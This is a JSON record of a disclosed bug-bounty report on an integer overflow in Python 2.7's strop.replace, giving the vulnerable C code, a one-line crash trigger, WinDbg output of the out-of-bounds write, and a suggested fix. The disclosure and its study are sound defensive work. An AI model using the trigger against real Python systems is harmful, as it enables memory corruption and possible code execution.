{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-05-02T05:21:33.807Z", 
    "voters": [
        "dyabla", 
        "jaybosamiya"
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "500.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 129771, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2016-04-30T22:47:09.214Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Python 2.7 strop.replace Integer Overflow", 
    "is_member_of_team?": null, 
    "vote_count": 2, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-05-30T22:47:09.298Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$500", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2016-04-30T22:46:58.828Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-30T22:46:58.828Z", 
            "actor": {
                "url": "/ibb-python", 
                "profile": {
                    "name": "Python (IBB)"
                }, 
                "ibb": true, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/027/79e9602e5e25d02b7c34cdbc40438408f47e7cd7_medium.png?1383737131"
                }
            }, 
            "team_handle": "ibb-python", 
            "bounty_amount": "500.0", 
            "collaborator": {
                "username": "johnleitch", 
                "url": "/johnleitch"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 934956, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "johnleitch", 
                "url": "/johnleitch"
            }, 
            "created_at": "2016-04-30T22:47:04.589Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-30T22:47:04.589Z", 
            "actor": {
                "username": "arice", 
                "url": "/arice", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/020/74e2a8a31fee27a0c9b3d1d90dd64f4e38b2fb1c_medium.jpeg?1466604112"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ibb-python", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 934957, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-30T22:47:09.248Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-30T22:47:09.248Z", 
            "actor": {
                "username": "arice", 
                "url": "/arice", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/020/74e2a8a31fee27a0c9b3d1d90dd64f4e38b2fb1c_medium.jpeg?1466604112"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ibb-python", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 934958, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-02T05:21:33.848Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-02T05:21:33.848Z", 
            "actor": {
                "username": "johnleitch", 
                "url": "/johnleitch", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ibb-python", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 935780, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-02T05:21:33.931Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-02T05:21:33.931Z", 
            "actor": {
                "username": "johnleitch", 
                "url": "/johnleitch", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ibb-python", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 935781, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "johnleitch", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/johnleitch", 
        "profile_picture_urls": {
            "small": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 2, 
        "name": "Memory Corruption - Generic"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -79488465.71233407, 
    "disclosed_at": "2016-05-02T05:21:33.907Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/129771", 
    "created_at": "2016-04-11T07:43:33.207Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>I reported this via email a while ago, and I think it slipped through the cracks. This one&#39;s nice clean overflow in the strop module, which is deprecated but still available in Python 2.7 and in use.</p>\n\n<p>Original url: <a title=\"https://bugs.python.org/issue24708\" href=\"/redirect?signature=77da25bab368b878d3cdd4a3325f44ed5ae87f90&amp;url=https%3A%2F%2Fbugs.python.org%2Fissue24708\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://bugs.python.org/issue24708</span><i class=\"icon-external-link\"></i></a></p>\n\n<hr>\n\n<p>The Python strop.replace() method suffers from an integer overflow that can be exploited to write outside the bounds of the string buffer and potentially achieve code execution. The issue can be triggered by performing a large substitution that overflows the arithmetic used in mymemreplace() to calculate the size of the new string:</p>\n\n<p>static char *<br>\nmymemreplace(const char <em>str, Py_ssize_t len,           /</em> input string <em>/<br>\n         const char *pat, Py_ssize_t pat_len,           /</em> pattern string to find <em>/<br>\n         const char *sub, Py_ssize_t sub_len,           /</em> substitution string <em>/<br>\n         Py_ssize_t count,                              /</em> number of replacements */<br>\n         Py_ssize_t *out_len)<br>\n{<br>\n    [...]</p>\n<pre class=\"highlight plaintext\"><code>new_len = len + nfound*(sub_len - pat_len); &lt;&lt;&lt;&lt; Unchecked arithmetic can overflow here.\nif (new_len == 0) {\n    /* Have to allocate something for the caller to free(). */\n    out_s = (char *)PyMem_MALLOC(1);\n    if (out_s == NULL)\n        return NULL;\n    out_s[0] = &#39;\\0&#39;;\n}\nelse {\n    assert(new_len &gt; 0);\n    new_s = (char *)PyMem_MALLOC(new_len); &lt;&lt;&lt;&lt; An allocation is performed using overflowed value.\n    if (new_s == NULL)\n        return NULL;\n    out_s = new_s;\n\n    for (; count &gt; 0 &amp;&amp; len &gt; 0; --count) { &lt;&lt;&lt;&lt; Memory is copied to new_s using len, which can be greater than the overflowed new_len value.\n        /* find index of next instance of pattern */\n        offset = mymemfind(str, len, pat, pat_len);\n        if (offset == -1)\n            break;\n\n        /* copy non matching part of input string */\n        memcpy(new_s, str, offset);\n        str += offset + pat_len;\n        len -= offset + pat_len;\n\n        /* copy substitute into the output string */\n        new_s += offset;\n        memcpy(new_s, sub, sub_len);\n        new_s += sub_len;\n    }\n    /* copy any remaining values into output string */\n    if (len &gt; 0)\n        memcpy(new_s, str, len);\n}\n[...]\n</code></pre>\n<p>}</p>\n\n<p>The following script demonstrates the issue:</p>\n\n<p>import strop<br>\nstrop.replace(&quot;\\x75&quot;*0xEAAA,&quot;\\x75&quot;,&quot;AA&quot;*0xAAAA)</p>\n\n<p>When run under a debugger, it produces the following exception:</p>\n\n<p>0:000&gt; r<br>\neax=01e4cfd0 ebx=5708fc94 ecx=00003c7a edx=00000000 esi=01e3dde8 edi=57096000<br>\neip=7026ae7a esp=0027fc98 ebp=0027fca0 iopl=0         nv up ei pl nz ac pe nc<br>\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010216<br>\nMSVCR90!memcpy+0x5a:<br>\n7026ae7a f3a5            rep movs dword ptr es:[edi],dword ptr [esi]<br>\n0:000&gt; db edi-0x10<br>\n57095ff0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA<br>\n57096000  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????<br>\n57096010  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????<br>\n57096020  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????<br>\n57096030  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????<br>\n57096040  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????<br>\n57096050  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????<br>\n57096060  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????<br>\n0:000&gt; db esi<br>\n01e3dde8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA<br>\n01e3ddf8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA<br>\n01e3de08  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA<br>\n01e3de18  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA<br>\n01e3de28  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA<br>\n01e3de38  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA<br>\n01e3de48  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA<br>\n01e3de58  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA<br>\n0:000&gt; k<br>\nChildEBP RetAddr<br><br>\n0027fca0 1e056efc MSVCR90!memcpy+0x5a [f:\\dd\\vctools\\crt_bld\\SELF_X86\\crt\\src\\INTEL\\memcpy.asm @ 188]<br>\n0027fcd0 1e05700b python27!mymemreplace+0xfc [c:\\build27\\cpython\\modules\\stropmodule.c @ 1139]<br>\n0027fd18 1e0aaed7 python27!strop_replace+0xbb [c:\\build27\\cpython\\modules\\stropmodule.c @ 1185]<br>\n0027fd30 1e0edcc0 python27!PyCFunction_Call+0x47 [c:\\build27\\cpython\\objects\\methodobject.c @ 81]<br>\n0027fd5c 1e0f012a python27!call_function+0x2b0 [c:\\build27\\cpython\\python\\ceval.c @ 4035]<br>\n0027fdcc 1e0f1100 python27!PyEval_EvalFrameEx+0x239a [c:\\build27\\cpython\\python\\ceval.c @ 2684]<br>\n0027fe00 1e0f1162 python27!PyEval_EvalCodeEx+0x690 [c:\\build27\\cpython\\python\\ceval.c @ 3267]<br>\n0027fe2c 1e1170ca python27!PyEval_EvalCode+0x22 [c:\\build27\\cpython\\python\\ceval.c @ 674]<br>\n0027fe44 1e118215 python27!run_mod+0x2a [c:\\build27\\cpython\\python\\pythonrun.c @ 1371]<br>\n0027fe64 1e1187b0 python27!PyRun_FileExFlags+0x75 [c:\\build27\\cpython\\python\\pythonrun.c @ 1358]<br>\n0027fea4 1e119129 python27!PyRun_SimpleFileExFlags+0x190 [c:\\build27\\cpython\\python\\pythonrun.c @ 950]<br>\n0027fec0 1e038cb5 python27!PyRun_AnyFileExFlags+0x59 [c:\\build27\\cpython\\python\\pythonrun.c @ 753]<br>\n0027ff3c 1d00116d python27!Py_Main+0x965 [c:\\build27\\cpython\\modules\\main.c @ 643]<br>\n0027ff80 74b97c04 python!<strong>tmainCRTStartup+0x10f [f:\\dd\\vctools\\crt_bld\\self_x86\\crt\\src\\crtexe.c @ 586]<br>\n0027ff94 7701ad1f KERNEL32!BaseThreadInitThunk+0x24<br>\n0027ffdc 7701acea ntdll!</strong>RtlUserThreadStart+0x2f<br>\n0027ffec 00000000 ntdll!_RtlUserThreadStart+0x1b<br>\n0:000&gt; !analyze -v -nodb</p>\n\n<hr>\n\n<ul>\n<li>                                                                            *</li>\n<li>                       Exception Analysis                                   *</li>\n<li>                                                                            *\n*******************************************************************************</li>\n</ul>\n\n<p>FAULTING_IP: <br>\nMSVCR90!memcpy+5a [f:\\dd\\vctools\\crt_bld\\SELF_X86\\crt\\src\\INTEL\\memcpy.asm @ 188]<br>\n7026ae7a f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</p>\n\n<p>EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)<br>\nExceptionAddress: 7026ae7a (MSVCR90!memcpy+0x0000005a)<br>\n   ExceptionCode: c0000005 (Access violation)<br>\n  ExceptionFlags: 00000000<br>\nNumberParameters: 2<br>\n   Parameter[0]: 00000001<br>\n   Parameter[1]: 57096000<br>\nAttempt to write to address 57096000</p>\n\n<p>CONTEXT:  00000000 -- (.cxr 0x0;r)<br>\neax=01e4cfd0 ebx=5708fc94 ecx=00003c7a edx=00000000 esi=01e3dde8 edi=57096000<br>\neip=7026ae7a esp=0027fc98 ebp=0027fca0 iopl=0         nv up ei pl nz ac pe nc<br>\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010216<br>\nMSVCR90!memcpy+0x5a:<br>\n7026ae7a f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</p>\n\n<p>FAULTING_THREAD:  00001408</p>\n\n<p>PROCESS_NAME:  python.exe</p>\n\n<p>ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%08lx referenced memory at 0x%08lx. The memory could not be %s.</p>\n\n<p>EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%08lx referenced memory at 0x%08lx. The memory could not be %s.</p>\n\n<p>EXCEPTION_PARAMETER1:  00000001</p>\n\n<p>EXCEPTION_PARAMETER2:  57096000</p>\n\n<p>WRITE_ADDRESS:  57096000 </p>\n\n<p>FOLLOWUP_IP: <br>\nMSVCR90!memcpy+5a [f:\\dd\\vctools\\crt_bld\\SELF_X86\\crt\\src\\INTEL\\memcpy.asm @ 188]<br>\n7026ae7a f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</p>\n\n<p>NTGLOBALFLAG:  470</p>\n\n<p>APPLICATION_VERIFIER_FLAGS:  0</p>\n\n<p>APP:  python.exe</p>\n\n<p>ANALYSIS_VERSION: 6.3.9600.17029 (debuggers(dbg).140219-1702) x86fre</p>\n\n<p>BUGCHECK_STR:  APPLICATION_FAULT_STRING_DEREFERENCE_INVALID_POINTER_WRITE_FILL_PATTERN_NXCODE</p>\n\n<p>PRIMARY_PROBLEM_CLASS:  STRING_DEREFERENCE_FILL_PATTERN_NXCODE</p>\n\n<p>DEFAULT_BUCKET_ID:  STRING_DEREFERENCE_FILL_PATTERN_NXCODE</p>\n\n<p>LAST_CONTROL_TRANSFER:  from 1e056efc to 7026ae7a</p>\n\n<p>STACK_TEXT:<br><br>\n0027fca0 1e056efc 5708fc94 01e37a7c 00015554 MSVCR90!memcpy+0x5a<br>\n0027fcd0 1e05700b 01e2ba4e 38e171c8 01d244cc python27!mymemreplace+0xfc<br>\n0027fd18 1e0aaed7 00000000 01cebe40 01de2c38 python27!strop_replace+0xbb<br>\n0027fd30 1e0edcc0 01de2c38 01cebe40 00000000 python27!PyCFunction_Call+0x47<br>\n0027fd5c 1e0f012a 0027fdb4 01ce6c80 01ce6c80 python27!call_function+0x2b0<br>\n0027fdcc 1e0f1100 01ddd9d0 00000000 01ce6c80 python27!PyEval_EvalFrameEx+0x239a<br>\n0027fe00 1e0f1162 01ce6c80 01ddd9d0 01ceaa50 python27!PyEval_EvalCodeEx+0x690<br>\n0027fe2c 1e1170ca 01ce6c80 01ceaa50 01ceaa50 python27!PyEval_EvalCode+0x22<br>\n0027fe44 1e118215 01dca090 01ceaa50 01ceaa50 python27!run_mod+0x2a<br>\n0027fe64 1e1187b0 702c7408 00342ebb 00000101 python27!PyRun_FileExFlags+0x75<br>\n0027fea4 1e119129 702c7408 00342ebb 00000001 python27!PyRun_SimpleFileExFlags+0x190<br>\n0027fec0 1e038cb5 702c7408 00342ebb 00000001 python27!PyRun_AnyFileExFlags+0x59<br>\n0027ff3c 1d00116d 00000002 00342e98 00341950 python27!Py_Main+0x965<br>\n0027ff80 74b97c04 7ffde000 74b97be0 b4e726fd python!<strong>tmainCRTStartup+0x10f<br>\n0027ff94 7701ad1f 7ffde000 b723218a 00000000 KERNEL32!BaseThreadInitThunk+0x24<br>\n0027ffdc 7701acea ffffffff 77000212 00000000 ntdll!</strong>RtlUserThreadStart+0x2f<br>\n0027ffec 00000000 1d001314 7ffde000 00000000 ntdll!_RtlUserThreadStart+0x1b</p>\n\n<p>STACK_COMMAND:  .cxr 0x0 ; kb</p>\n\n<p>FAULTING_SOURCE_LINE:  f:\\dd\\vctools\\crt_bld\\SELF_X86\\crt\\src\\INTEL\\memcpy.asm</p>\n\n<p>FAULTING_SOURCE_FILE:  f:\\dd\\vctools\\crt_bld\\SELF_X86\\crt\\src\\INTEL\\memcpy.asm</p>\n\n<p>FAULTING_SOURCE_LINE_NUMBER:  188</p>\n\n<p>FAULTING_SOURCE_CODE:<br><br>\nNo source found for &#39;f:\\dd\\vctools\\crt_bld\\SELF_X86\\crt\\src\\INTEL\\memcpy.asm&#39;</p>\n\n<p>SYMBOL_STACK_INDEX:  0</p>\n\n<p>SYMBOL_NAME:  msvcr90!memcpy+5a</p>\n\n<p>FOLLOWUP_NAME:  MachineOwner</p>\n\n<p>MODULE_NAME: MSVCR90</p>\n\n<p>IMAGE_NAME:  MSVCR90.dll</p>\n\n<p>DEBUG_FLR_IMAGE_TIMESTAMP:  51ea24a5</p>\n\n<p>FAILURE_BUCKET_ID:  STRING_DEREFERENCE_FILL_PATTERN_NXCODE_c0000005_MSVCR90.dll!memcpy</p>\n\n<p>BUCKET_ID:  APPLICATION_FAULT_STRING_DEREFERENCE_INVALID_POINTER_WRITE_FILL_PATTERN_NXCODE_msvcr90!memcpy+5a</p>\n\n<p>ANALYSIS_SOURCE:  UM</p>\n\n<p>FAILURE_ID_HASH_STRING:  um:string_dereference_fill_pattern_nxcode_c0000005_msvcr90.dll!memcpy</p>\n\n<p>FAILURE_ID_HASH:  {031149d8-0626-9042-d8b7-a1766b1c5514}</p>\n\n<h2 id=\"followup-machineowner\">Followup: MachineOwner</h2>\n\n<p>To fix the issue, mymemreplace should validate that the computed value new_len has not overflowed. To do this, (new_len - len) / nfound should be compared to sub_len - pat_len. If that are not equal, an overflow has occurred. Proposed patches for stropmodule.c and test_strop.py are attached.</p>\n", 
    "vulnerability_information": "I reported this via email a while ago, and I think it slipped through the cracks. This one's nice clean overflow in the strop module, which is deprecated but still available in Python 2.7 and in use.\n\nOriginal url: https://bugs.python.org/issue24708\n\n---\n\nThe Python strop.replace() method suffers from an integer overflow that can be exploited to write outside the bounds of the string buffer and potentially achieve code execution. The issue can be triggered by performing a large substitution that overflows the arithmetic used in mymemreplace() to calculate the size of the new string:\n\nstatic char *\nmymemreplace(const char *str, Py_ssize_t len,           /* input string */\n         const char *pat, Py_ssize_t pat_len,           /* pattern string to find */\n         const char *sub, Py_ssize_t sub_len,           /* substitution string */\n         Py_ssize_t count,                              /* number of replacements */\n         Py_ssize_t *out_len)\n{\n    [...]\n\n    new_len = len + nfound*(sub_len - pat_len); <<<< Unchecked arithmetic can overflow here.\n    if (new_len == 0) {\n        /* Have to allocate something for the caller to free(). */\n        out_s = (char *)PyMem_MALLOC(1);\n        if (out_s == NULL)\n            return NULL;\n        out_s[0] = '\\0';\n    }\n    else {\n        assert(new_len > 0);\n        new_s = (char *)PyMem_MALLOC(new_len); <<<< An allocation is performed using overflowed value.\n        if (new_s == NULL)\n            return NULL;\n        out_s = new_s;\n\n        for (; count > 0 && len > 0; --count) { <<<< Memory is copied to new_s using len, which can be greater than the overflowed new_len value.\n            /* find index of next instance of pattern */\n            offset = mymemfind(str, len, pat, pat_len);\n            if (offset == -1)\n                break;\n\n            /* copy non matching part of input string */\n            memcpy(new_s, str, offset);\n            str += offset + pat_len;\n            len -= offset + pat_len;\n\n            /* copy substitute into the output string */\n            new_s += offset;\n            memcpy(new_s, sub, sub_len);\n            new_s += sub_len;\n        }\n        /* copy any remaining values into output string */\n        if (len > 0)\n            memcpy(new_s, str, len);\n    }\n    [...]\n}\n\nThe following script demonstrates the issue:\n\nimport strop\nstrop.replace(\"\\x75\"*0xEAAA,\"\\x75\",\"AA\"*0xAAAA)\n\nWhen run under a debugger, it produces the following exception:\n\n0:000> r\neax=01e4cfd0 ebx=5708fc94 ecx=00003c7a edx=00000000 esi=01e3dde8 edi=57096000\neip=7026ae7a esp=0027fc98 ebp=0027fca0 iopl=0         nv up ei pl nz ac pe nc\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010216\nMSVCR90!memcpy+0x5a:\n7026ae7a f3a5            rep movs dword ptr es:[edi],dword ptr [esi]\n0:000> db edi-0x10\n57095ff0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n57096000  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????\n57096010  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????\n57096020  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????\n57096030  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????\n57096040  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????\n57096050  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????\n57096060  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????\n0:000> db esi\n01e3dde8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n01e3ddf8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n01e3de08  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n01e3de18  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n01e3de28  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n01e3de38  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n01e3de48  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n01e3de58  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0:000> k\nChildEBP RetAddr  \n0027fca0 1e056efc MSVCR90!memcpy+0x5a [f:\\dd\\vctools\\crt_bld\\SELF_X86\\crt\\src\\INTEL\\memcpy.asm @ 188]\n0027fcd0 1e05700b python27!mymemreplace+0xfc [c:\\build27\\cpython\\modules\\stropmodule.c @ 1139]\n0027fd18 1e0aaed7 python27!strop_replace+0xbb [c:\\build27\\cpython\\modules\\stropmodule.c @ 1185]\n0027fd30 1e0edcc0 python27!PyCFunction_Call+0x47 [c:\\build27\\cpython\\objects\\methodobject.c @ 81]\n0027fd5c 1e0f012a python27!call_function+0x2b0 [c:\\build27\\cpython\\python\\ceval.c @ 4035]\n0027fdcc 1e0f1100 python27!PyEval_EvalFrameEx+0x239a [c:\\build27\\cpython\\python\\ceval.c @ 2684]\n0027fe00 1e0f1162 python27!PyEval_EvalCodeEx+0x690 [c:\\build27\\cpython\\python\\ceval.c @ 3267]\n0027fe2c 1e1170ca python27!PyEval_EvalCode+0x22 [c:\\build27\\cpython\\python\\ceval.c @ 674]\n0027fe44 1e118215 python27!run_mod+0x2a [c:\\build27\\cpython\\python\\pythonrun.c @ 1371]\n0027fe64 1e1187b0 python27!PyRun_FileExFlags+0x75 [c:\\build27\\cpython\\python\\pythonrun.c @ 1358]\n0027fea4 1e119129 python27!PyRun_SimpleFileExFlags+0x190 [c:\\build27\\cpython\\python\\pythonrun.c @ 950]\n0027fec0 1e038cb5 python27!PyRun_AnyFileExFlags+0x59 [c:\\build27\\cpython\\python\\pythonrun.c @ 753]\n0027ff3c 1d00116d python27!Py_Main+0x965 [c:\\build27\\cpython\\modules\\main.c @ 643]\n0027ff80 74b97c04 python!__tmainCRTStartup+0x10f [f:\\dd\\vctools\\crt_bld\\self_x86\\crt\\src\\crtexe.c @ 586]\n0027ff94 7701ad1f KERNEL32!BaseThreadInitThunk+0x24\n0027ffdc 7701acea ntdll!__RtlUserThreadStart+0x2f\n0027ffec 00000000 ntdll!_RtlUserThreadStart+0x1b\n0:000> !analyze -v -nodb\n*******************************************************************************\n*                                                                             *\n*                        Exception Analysis                                   *\n*                                                                             *\n*******************************************************************************\n\n\nFAULTING_IP: \nMSVCR90!memcpy+5a [f:\\dd\\vctools\\crt_bld\\SELF_X86\\crt\\src\\INTEL\\memcpy.asm @ 188]\n7026ae7a f3a5            rep movs dword ptr es:[edi],dword ptr [esi]\n\nEXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)\nExceptionAddress: 7026ae7a (MSVCR90!memcpy+0x0000005a)\n   ExceptionCode: c0000005 (Access violation)\n  ExceptionFlags: 00000000\nNumberParameters: 2\n   Parameter[0]: 00000001\n   Parameter[1]: 57096000\nAttempt to write to address 57096000\n\nCONTEXT:  00000000 -- (.cxr 0x0;r)\neax=01e4cfd0 ebx=5708fc94 ecx=00003c7a edx=00000000 esi=01e3dde8 edi=57096000\neip=7026ae7a esp=0027fc98 ebp=0027fca0 iopl=0         nv up ei pl nz ac pe nc\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010216\nMSVCR90!memcpy+0x5a:\n7026ae7a f3a5            rep movs dword ptr es:[edi],dword ptr [esi]\n\nFAULTING_THREAD:  00001408\n\nPROCESS_NAME:  python.exe\n\nERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%08lx referenced memory at 0x%08lx. The memory could not be %s.\n\nEXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%08lx referenced memory at 0x%08lx. The memory could not be %s.\n\nEXCEPTION_PARAMETER1:  00000001\n\nEXCEPTION_PARAMETER2:  57096000\n\nWRITE_ADDRESS:  57096000 \n\nFOLLOWUP_IP: \nMSVCR90!memcpy+5a [f:\\dd\\vctools\\crt_bld\\SELF_X86\\crt\\src\\INTEL\\memcpy.asm @ 188]\n7026ae7a f3a5            rep movs dword ptr es:[edi],dword ptr [esi]\n\nNTGLOBALFLAG:  470\n\nAPPLICATION_VERIFIER_FLAGS:  0\n\nAPP:  python.exe\n\nANALYSIS_VERSION: 6.3.9600.17029 (debuggers(dbg).140219-1702) x86fre\n\nBUGCHECK_STR:  APPLICATION_FAULT_STRING_DEREFERENCE_INVALID_POINTER_WRITE_FILL_PATTERN_NXCODE\n\nPRIMARY_PROBLEM_CLASS:  STRING_DEREFERENCE_FILL_PATTERN_NXCODE\n\nDEFAULT_BUCKET_ID:  STRING_DEREFERENCE_FILL_PATTERN_NXCODE\n\nLAST_CONTROL_TRANSFER:  from 1e056efc to 7026ae7a\n\nSTACK_TEXT:  \n0027fca0 1e056efc 5708fc94 01e37a7c 00015554 MSVCR90!memcpy+0x5a\n0027fcd0 1e05700b 01e2ba4e 38e171c8 01d244cc python27!mymemreplace+0xfc\n0027fd18 1e0aaed7 00000000 01cebe40 01de2c38 python27!strop_replace+0xbb\n0027fd30 1e0edcc0 01de2c38 01cebe40 00000000 python27!PyCFunction_Call+0x47\n0027fd5c 1e0f012a 0027fdb4 01ce6c80 01ce6c80 python27!call_function+0x2b0\n0027fdcc 1e0f1100 01ddd9d0 00000000 01ce6c80 python27!PyEval_EvalFrameEx+0x239a\n0027fe00 1e0f1162 01ce6c80 01ddd9d0 01ceaa50 python27!PyEval_EvalCodeEx+0x690\n0027fe2c 1e1170ca 01ce6c80 01ceaa50 01ceaa50 python27!PyEval_EvalCode+0x22\n0027fe44 1e118215 01dca090 01ceaa50 01ceaa50 